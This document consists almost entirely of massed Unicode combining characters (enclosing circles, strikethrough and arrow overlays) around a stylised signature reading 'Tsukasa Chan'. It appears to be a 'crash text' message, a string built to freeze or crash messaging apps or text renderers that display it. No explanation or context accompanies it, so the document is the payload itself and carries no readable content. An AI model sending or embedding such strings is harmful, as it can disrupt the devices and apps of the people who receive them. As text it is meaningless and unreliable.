⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝